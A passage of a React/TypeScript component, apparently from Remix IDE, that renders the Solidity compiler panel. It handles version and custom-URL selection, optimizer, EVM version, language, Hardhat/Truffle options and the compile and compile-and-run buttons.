      ;(api as any).currentFile = originalFile
    }
  }
  const _updateVersionSelector = (version, customUrl = '', setQueryParameter = true) => {
    // update selectedversion of previous one got filtered out
    let selectedVersion = version
    if (!selectedVersion || !_shouldBeAdded(selectedVersion)) {
      selectedVersion = state.defaultVersion
      setState((prevState) => {
        return { ...prevState, selectedVersion }
      })
    }
    updateCurrentVersion(selectedVersion)
    if (setQueryParameter)
      api.setCompilerQueryParameters({ version: selectedVersion })
    let url

    if (customUrl !== '') {
      selectedVersion = customUrl
      setState((prevState) => {
        return {
          ...prevState,
          selectedVersion,
          customVersions: [...state.customVersions, selectedVersion]
        }
      })
      updateCurrentVersion(selectedVersion)
      url = customUrl
      if (setQueryParameter)
        api.setCompilerQueryParameters({ version: selectedVersion })
    } else {
      if (checkSpecialChars(selectedVersion)) {
        return console.log('loading ' + selectedVersion + ' not allowed, special chars not allowed.')
      }
      if (selectedVersion === 'builtin' || selectedVersion.indexOf('soljson') === 0) {
        url = urlFromVersion(selectedVersion)
      } else {
        return console.log('loading ' + selectedVersion + ' not allowed, version should start with "soljson"')
      }
    }

    // Workers cannot load js on "file:"-URLs and we get a
    // "Uncaught RangeError: Maximum call stack size exceeded" error on Chromium,
    // resort to non-worker version in that case.
    if (selectedVersion === 'builtin') selectedVersion = state.defaultVersion
    if (selectedVersion !== 'builtin' && (canUseWorker(selectedVersion) || platform === appPlatformTypes.desktop)) {
      compileTabLogic.compiler.loadVersion(true, url)
    } else {
      compileTabLogic.compiler.loadVersion(false, url)
    }
  }

  const _shouldBeAdded = (version) => {
    return !version.includes('nightly') || (version.includes('nightly') && state.includeNightlies)
  }

  const promptCompiler = () => {
    // custom url https://solidity-blog.s3.eu-central-1.amazonaws.com/data/08preview/soljson.js
    modal(
      intl.formatMessage({
        id: 'solidity.addACustomCompiler'
      }),
      promptMessage('URL'),
      intl.formatMessage({ id: 'solidity.ok' }),
      addCustomCompiler,
      false,
      intl.formatMessage({ id: 'solidity.cancel' }),
      () => {}
    )
  }

  const showCompilerLicense = () => {
    modal(
      intl.formatMessage({ id: 'solidity.compilerLicense' }),
      state.compilerLicense ? state.compilerLicense : intl.formatMessage({ id: 'solidity.compilerLicenseMsg3' }),
      intl.formatMessage({ id: 'solidity.ok' }),
      () => {}
    )
  }

  const promptMessage = (message) => {
    return (
      <>
        <span>{message}</span>
        <input type="text" data-id="modalDialogCustomPromptCompiler" className="form-control" ref={promptMessageInput} />
      </>
    )
  }

  const addCustomCompiler = () => {
    const url = promptMessageInput.current.value

    setState((prevState) => {
      return { ...prevState, selectedVersion: url }
    })
    _updateVersionSelector(state.defaultVersion, url)
  }

  const handleLoadVersion = (value) => {
    if (value !== 'builtin' && !pathToURL[value]) return
    setState((prevState) => {
      return { ...prevState, selectedVersion: value, matomoAutocompileOnce: true }
    })
    updateCurrentVersion(value)
    _updateVersionSelector(value)
    _updateLanguageSelector()
  }

  const _updateLanguageSelector = () => {
    // This is the first version when Yul is available
    if (!semver.valid(_retrieveVersion()) || semver.lt(_retrieveVersion(), 'v0.5.7+commit.6da8b019.js')) {
      handleLanguageChange('Solidity')
      compileTabLogic.setLanguage('Solidity')
    }
  }

  const handleAutoCompile = (e) => {
    const checked = e.target.checked

    api.setAppParameter('autoCompile', checked)
    checked && compile()
    setState((prevState) => {
      return {
        ...prevState,
        autoCompile: checked,
        matomoAutocompileOnce: state.matomoAutocompileOnce || checked
      }
    })
  }

  const handleOptimizeChange = (value) => {
    const checked = !!value

    api.setAppParameter('optimize', checked)
    compileTabLogic.setOptimize(checked)
    if (compileTabLogic.optimize) {
      compileTabLogic.setRuns(parseInt(state.runs))
    } else {
      compileTabLogic.setRuns(200)
    }
    state.autoCompile && compile()
    setState((prevState) => {
      return { ...prevState, optimize: checked }
    })
  }

  const onChangeRuns = (value) => {
    const runs = value

    compileTabLogic.setRuns(parseInt(runs))
    state.autoCompile && compile()
    setState((prevState) => {
      return { ...prevState, runs }
    })
  }

  const handleHideWarningsChange = (e) => {
    const checked = e.target.checked

    api.setAppParameter('hideWarnings', checked)
    state.autoCompile && compile()
    setState((prevState) => {
      return { ...prevState, hideWarnings: checked }
    })
  }

  const handleNightliesChange = (e) => {
    const checked = e.target.checked

    if (!checked) handleLoadVersion(state.defaultVersion)
    api.setAppParameter('includeNightlies', checked)
    setState((prevState) => {
      return { ...prevState, includeNightlies: checked }
    })
  }

  const handleOnlyDownloadedChange = (e) => {
    const checked = e.target.checked
    if (!checked) handleLoadVersion(state.defaultVersion)
    setState((prevState) => {
      return { ...prevState, onlyDownloaded: checked }
    })
  }

  const handleLanguageChange = (value) => {
    compileTabLogic.setLanguage(value)
    state.autoCompile && compile()
    setState((prevState) => {
      return { ...prevState, language: value }
    })
  }

  const handleEvmVersionChange = (value) => {
    if (!value) return
    let v = value
    if (v === 'default') {
      v = null
    }
    compileTabLogic.setEvmVersion(v)
    state.autoCompile && compile()
    setState((prevState) => {
      return { ...prevState, evmVersion: value }
    })
  }

  const updatehhCompilation = (event) => {
    const checked = event.target.checked
    if (checked) setTruffleCompilation(false) // wayaround to reset the variable
    sethhCompilation(checked)
    api.setAppParameter('hardhat-compilation', checked)
  }

  const updateTruffleCompilation = (event) => {
    const checked = event.target.checked
    if (checked) sethhCompilation(false) // wayaround to reset the variable
    setTruffleCompilation(checked)
    api.setAppParameter('truffle-compilation', checked)
  }

  /*
    The following functions map with the above event handlers.
    They are an external API for modifying the compiler configuration.
  */
  const setConfiguration = (settings: ConfigurationSettings) => {
    handleLoadVersion(`soljson-v${settings.version}.js`)
    handleEvmVersionChange(settings.evmVersion)
    handleLanguageChange(settings.language)
    handleOptimizeChange(settings.optimize)
    onChangeRuns(settings.runs)
  }

  const toggleConfigurations = () => {
    setToggleExpander(!toggleExpander)
  }

  return (
    <section>
      <article>
        <div className="pt-0 px-4">
          <div className="mb-1">
            <label className="remixui_compilerLabel form-check-label" htmlFor="versionSelector">
              <FormattedMessage id="solidity.compiler" />
            </label>

            <CustomTooltip
              placement="bottom"
              tooltipId="promptCompilerTooltip"
              tooltipClasses="text-nowrap"
              tooltipText={<FormattedMessage id="solidity.addACustomCompilerWithURL" />}
            >
              <span className="fas fa-plus border-0 p-0 ml-3" onClick={() => promptCompiler()}></span>
            </CustomTooltip>
            <CustomTooltip
              placement="bottom"
              tooltipId="showCompilerTooltip"
              tooltipClasses="text-nowrap"
              tooltipText={<FormattedMessage id="solidity.seeCompilerLicense" />}
            >
              <span className="far fa-file-certificate border-0 p-0 ml-2" onClick={() => showCompilerLicense()}></span>
            </CustomTooltip>
            { solJsonBinData && solJsonBinData.selectorList && solJsonBinData.selectorList.length > 0 ? (
              <CompilerDropdown
                allversions={solJsonBinData.selectorList}
                customVersions={state.customVersions}
                selectedVersion={state.selectedVersion}
                defaultVersion={state.defaultVersion}
                handleLoadVersion={handleLoadVersion}
                _shouldBeAdded={_shouldBeAdded}
                onlyDownloaded={state.onlyDownloaded}
              ></CompilerDropdown>):null}
          </div>
          <div className="mb-2 flex-row-reverse d-flex flex-row custom-control custom-checkbox">
            <input className="mr-2 custom-control-input" id="nightlies" type="checkbox" onChange={handleNightliesChange} checked={state.includeNightlies} />
            <label htmlFor="nightlies" data-id="compilerNightliesBuild" className="pt-0 form-check-label custom-control-label">
              <FormattedMessage id="solidity.includeNightlyBuilds" />
            </label>
          </div>
          {platform === appPlatformTypes.desktop ?
            <div className="mb-2 flex-row-reverse d-flex flex-row custom-control custom-checkbox">
              <input className="mr-2 custom-control-input" id="downloadedcompilers" type="checkbox" onChange={handleOnlyDownloadedChange} checked={state.onlyDownloaded} />
              <label htmlFor="downloadedcompilers" data-id="compilerNightliesBuild" className="form-check-label custom-control-label">
                <FormattedMessage id="solidity.downloadedCompilers" />
              </label>
            </div>:null}
          <div className="mt-2 remixui_compilerConfig custom-control custom-checkbox">
            <input
              className="custom-control-input"
              type="checkbox"
              onChange={handleAutoCompile}
              data-id="compilerContainerAutoCompile"
              id="autoCompile"
              title="Auto compile"
              checked={state.autoCompile}
            />
            <label className="form-check-label custom-control-label" htmlFor="autoCompile">
              <FormattedMessage id="solidity.autoCompile" />
            </label>
          </div>
          <div className="mt-1 mb-2 remixui_compilerConfig custom-control custom-checkbox">
            <input
              className="custom-control-input"
              onChange={handleHideWarningsChange}
              id="hideWarningsBox"
              type="checkbox"
              title="Hide warnings"
              checked={state.hideWarnings}
            />
            <label className="form-check-label custom-control-label" htmlFor="hideWarningsBox">
              <FormattedMessage id="solidity.hideWarnings" />
            </label>
          </div>
          {isHardhatProject && (
            <div className="mt-3 remixui_compilerConfig custom-control custom-checkbox">
              <input
                className="custom-control-input"
                onChange={updatehhCompilation}
                id="enableHardhat"
                type="checkbox"
                title="Enable Hardhat Compilation"
                checked={hhCompilation}
              />
              <label className="form-check-label custom-control-label" htmlFor="enableHardhat">
                <FormattedMessage id="solidity.enableHardhat" />
              </label>
              <a className="mt-1 text-nowrap" href="https://remix-ide.readthedocs.io/en/latest/hardhat.html#enable-hardhat-compilation" target={'_blank'}>
                <CustomTooltip
                  placement={'right'}
                  tooltipClasses="text-nowrap"
                  tooltipId="overlay-tooltip-hardhat"
                  tooltipText={
                    <span className="border bg-light text-dark p-1 pr-3" style={{ minWidth: '230px' }}>
                      <FormattedMessage id="solidity.learnHardhat" />
                    </span>
                  }
                >
                  <i className={'ml-2 fas fa-info'} aria-hidden="true"></i>
                </CustomTooltip>
              </a>
            </div>
          )}
          {isTruffleProject && (
            <div className="mt-3 remixui_compilerConfig custom-control custom-checkbox">
              <input
                className="custom-control-input"
                onChange={updateTruffleCompilation}
                id="enableTruffle"
                type="checkbox"
                title="Enable Truffle Compilation"
                checked={truffleCompilation}
              />
              <label className="form-check-label custom-control-label" htmlFor="enableTruffle">
                <FormattedMessage id="solidity.enableTruffle" />
              </label>
              <a className="mt-1 text-nowrap" href="https://remix-ide.readthedocs.io/en/latest/truffle.html#enable-truffle-compilation" target={'_blank'}>
                <CustomTooltip
                  placement={'right'}
                  tooltipClasses="text-nowrap"
                  tooltipId="overlay-tooltip-truffle"
                  tooltipText={
                    <span className="border bg-light text-dark p-1 pr-3" style={{ minWidth: '230px' }}>
                      <FormattedMessage id="solidity.learnTruffle" />
                    </span>
                  }
                >
                  <i style={{ fontSize: 'medium' }} className={'ml-2 fas fa-info'} aria-hidden="true"></i>
                </CustomTooltip>
              </a>
            </div>
          )}
        </div>
        <div className="d-flex px-4 remixui_compilerConfigSection justify-content-between" onClick={toggleConfigurations}>
          <div className="d-flex">
            <label className="mt-1 remixui_compilerConfigSection">
              <FormattedMessage id="solidity.advancedConfigurations" />
            </label>
          </div>
          <div>
            <span data-id="scConfigExpander" onClick={toggleConfigurations}>
              <i className={!toggleExpander ? 'fas fa-angle-right' : 'fas fa-angle-down'} aria-hidden="true"></i>
            </span>
          </div>
        </div>
        <div className={`px-4 pb-4 border-bottom flex-column ${toggleExpander ? 'd-flex' : 'd-none'}`}>
          <div className="d-flex pb-1 remixui_compilerConfig custom-control custom-radio">
            <input
              className="custom-control-input"
              type="radio"
              name="configradio"
              value="manual"
              onChange={toggleConfigType}
              checked={!state.useFileConfiguration}
              id="scManualConfig"
            />
            <label className="form-check-label custom-control-label" htmlFor="scManualConfig" data-id="scManualConfiguration">
              <FormattedMessage id="solidity.compilerConfiguration" />
            </label>
          </div>
          <div className={`flex-column 'd-flex'}`}>
            <div className="mb-2 ml-4">
              <label className="remixui_compilerLabel form-check-label" htmlFor="compilerLanguageSelector">
                <FormattedMessage id="solidity.language" />
              </label>
              <CustomTooltip
                placement="right"
                tooltipId="compilerLabelTooltip"
                tooltipClasses="text-nowrap"
                tooltipText={
                  <span>
                    <FormattedMessage id="solidity.tooltipText6" />
                  </span>
                }
              >
                <div id="compilerLanguageSelectorWrapper">
                  <select
                    onChange={(e) => handleLanguageChange(e.target.value)}
                    disabled={state.useFileConfiguration}
                    value={state.language}
                    className="custom-select"
                    id="compilerLanguageSelector"
                    style={{
                      pointerEvents: state.useFileConfiguration ? 'none' : 'auto'
                    }}
                  >
                    <option data-id={state.language === 'Solidity' ? 'selected' : ''} value="Solidity">
                      Solidity
                    </option>
                    <option data-id={state.language === 'Yul' ? 'selected' : ''} value="Yul">
                      Yul
                    </option>
                  </select>
                </div>
              </CustomTooltip>
            </div>
            <div className="mb-2 ml-4">
              <label className="remixui_compilerLabel form-check-label" htmlFor="evmVersionSelector">
                <FormattedMessage id="solidity.evmVersion" />
              </label>
              <select
                value={state.evmVersion}
                onChange={(e) => handleEvmVersionChange(e.target.value)}
                disabled={state.useFileConfiguration}
                className="custom-select"
                id="evmVersionSelector"
              >
                {compileTabLogic.evmVersions.map((version, index) => (
                  <option key={index} data-id={state.evmVersion === version ? 'selected' : ''} value={version}>
                    {version === 'default' ? `default (${compileTabLogic.evmVersions[index + 1]})` : version}
                  </option>
                ))}
              </select>
            </div>
            <div className="mt-1 mt-3 border-dark pb-3 ml-4 remixui_compilerConfig ">
              <div className="justify-content-between align-items-center d-flex">
                <CustomTooltip
                  placement="top"
                  tooltipId="configfileOptimisationNumbeTooltip"
                  tooltipClasses="text-nowrap"
                  tooltipText={(!state.optimize ? "Enable " : "Disable ") + "opcode-based optimizer for the generated bytecode and the Yul optimizer for the Yul code"}
                >
                  <div className='custom-control custom-checkbox'>
                    <input
                      onChange={(e) => {
                        handleOptimizeChange(e.target.checked)
                      }}
                      disabled={state.useFileConfiguration}
                      className="custom-control-input"
                      id="optimize"
                      type="checkbox"
                      checked={state.optimize}
                    />
                    <label className="form-check-label custom-control-label" htmlFor="optimize">
                      <FormattedMessage id="solidity.enableOptimization" />
                    </label>
                  </div>
                </CustomTooltip>
                <CustomTooltip
                  placement="top"
                  tooltipId="configfileOptimisationNumberTooltip"
                  tooltipClasses="text-nowrap"
                  tooltipText={intl.formatMessage({ id: 'solidity.inputTitle2' })}
                >
                  <input
                    min="1"
                    className="custom-select ml-2 remixui_runs"
                    id="runs"
                    placeholder="200"
                    value={state.runs}
                    type="number"
                    onChange={(e) => onChangeRuns(e.target.value)}
                    disabled={!state.optimize || state.useFileConfiguration}
                  />
                </CustomTooltip>
              </div>
            </div>
          </div>
          <div className="d-flex pb-1 remixui_compilerConfig custom-control custom-radio">
            <input
              className="custom-control-input"
              type="radio"
              name="configradio"
              value="file"
              onChange={toggleConfigType}
              checked={state.useFileConfiguration}
              id="scFileConfig"
            />
            <label className="form-check-label custom-control-label" htmlFor="scFileConfig" data-id="scFileConfiguration">
              <FormattedMessage id="solidity.useConfigurationFile" />
            </label>
          </div>
          <div className={`pt-2 ml-4 ml-2 align-items-start justify-content-between d-flex`}>
            {!showFilePathInput && state.useFileConfiguration && (
              <CustomTooltip
                placement="bottom"
                tooltipId="configfileTooltip"
                tooltipClasses="text-nowrap"
                tooltipText={
                  <span>
                    <FormattedMessage id="solidity.tooltipText4" />
                  </span>
                }
              >
                <span
                  onClick={
                    configFilePath === ''
                      ? () => {}
                      : async () => {
                        await openFile()
                      }
                  }
                  className="py-2 remixui_compilerConfigPath"
                >
                  {configFilePath === '' ? intl.formatMessage({ id: 'solidity.noFileSelected1' }) : configFilePath}
                </span>
              </CustomTooltip>
            )}
            {!showFilePathInput && !state.useFileConfiguration && <span className="py-2 text-secondary">{configFilePath}</span>}
            <input
              ref={configFilePathInput}
              className={`py-0 my-0 form-control ${showFilePathInput ? 'd-flex' : 'd-none'}`}
              placeholder={'/folder_path/file_name.json'}
              title={intl.formatMessage({ id: 'solidity.inputTitle1' })}
              disabled={!state.useFileConfiguration}
              data-id="scConfigFilePathInput"
              onKeyPress={(event) => {
                if (event.key === 'Enter') {
                  handleConfigPathChange()
                }
              }}
            />
            {!showFilePathInput && (
              <button
                disabled={!state.useFileConfiguration}
                data-id="scConfigChangeFilePath"
                className="btn btn-sm btn-secondary"
                onClick={() => {
                  setShowFilePathInput(true)
                }}
              >
                <FormattedMessage id="solidity.change" />
              </button>
            )}
          </div>
        </div>
        <div className="px-4">
          <button
            id="compileBtn"
            data-id="compilerContainerCompileBtn"
            className="btn btn-primary btn-block d-block w-100 text-break remixui_disabled mb-1 mt-3"
            onClick={compile}
            disabled={(configFilePath === '' && state.useFileConfiguration) || disableCompileButton}
          >
            <CustomTooltip
              placement="auto"
              tooltipId="overlay-tooltip-compile"
              tooltipText={
                <div className="text-left">
                  {!(configFilePath === '' && state.useFileConfiguration) && (
                    <div>
                      <b>Ctrl+S</b> <FormattedMessage id="solidity.toCompile" /> {state.compiledFileName.endsWith('.sol') ? state.compiledFileName : null}{' '}
                    </div>
                  )}
                  {configFilePath === '' && state.useFileConfiguration && <div> <FormattedMessage id="solidity.noConfigFileSelected" /></div>}
                </div>
              }
            >
              <div className="d-flex align-items-center justify-content-center">
                {<i ref={compileIcon} className="fas fa-sync mr-2" aria-hidden="true"></i>}
                <div className="text-truncate overflow-hidden text-nowrap">
                  <span>
                    <FormattedMessage id="solidity.compile" />
                  </span>
                  <span className="ml-1 text-nowrap">
                    {typeof state.compiledFileName === 'string'
                      ? extractNameFromKey(state.compiledFileName) ||
                        `<${intl.formatMessage({
                          id: 'solidity.noFileSelected'
                        })}>`
                      : `<${intl.formatMessage({
                        id: 'solidity.noFileSelected'
                      })}>`}
                  </span>
                </div>
              </div>
            </CustomTooltip>
          </button>
          <div className="d-flex align-items-center">
            <button
              id="compileAndRunBtn"
              data-id="compilerContainerCompileAndRunBtn"
              className="btn btn-secondary btn-block d-block w-100 text-break  d-inline-block remixui_disabled mb-1 mt-1"
              onClick={compileAndRun}
              disabled={(configFilePath === '' && state.useFileConfiguration) || disableCompileButton}
            >
              <CustomTooltip
                placement={'auto-end'}
                tooltipId="overlay-tooltip-compile-run"
                tooltipText={
                  <div className="text-left">
                    {!(configFilePath === '' && state.useFileConfiguration) && (
                      <div>
                        <b>Ctrl+Shift+S</b> <FormattedMessage id="solidity.tooltipText3" />
                      </div>
                    )}
                    {configFilePath === '' && state.useFileConfiguration && <div> <FormattedMessage id="solidity.noConfigFileSelected" /></div>}
                  </div>
                }
              >
                <span>
                  <FormattedMessage id="solidity.compileAndRunScript" />
                </span>
              </CustomTooltip>
            </button>
            <CustomTooltip
              placement="top"
              tooltipId="overlay-tooltip-compile-run-doc"
              tooltipText={
                <div className="text-left p-2">
                  <div><FormattedMessage id="solidity.tooltipText1" /></div>
                  <pre>
                    <code>
                      /**
                      <br />
                      * @title ContractName
                      <br />
                      * @dev ContractDescription
                      <br />
                      * @custom:dev-run-script file_path
                      <br />
                      */
                      <br />
                      contract ContractName {'{}'}
                      <br />
                    </code>
                  </pre>
                  <FormattedMessage id="solidity.tooltipText2" />
                </div>
              }
            >
              <a href="https://remix-ide.readthedocs.io/en/latest/running_js_scripts.html#compile-a-contract-and-run-a-script-on-the-fly" target="_blank">
                <i className="pl-2 ml-2 fas fa-info text-dark"></i>
              </a>
            </CustomTooltip>
            <CopyToClipboard tip={intl.formatMessage({ id: 'solidity.copyNatSpecTag' })} getContent={() => '@custom:dev-run-script file_path'} direction="top">
              <button className="btn remixui_copyButton  ml-2 my-1 text-dark">
                <i className="remixui_copyIcon far fa-copy" aria-hidden="true"></i>
              </button>
            </CopyToClipboard>
          </div>
        </div>
      </article>
    </section>
  )
}

export default CompilerContainer
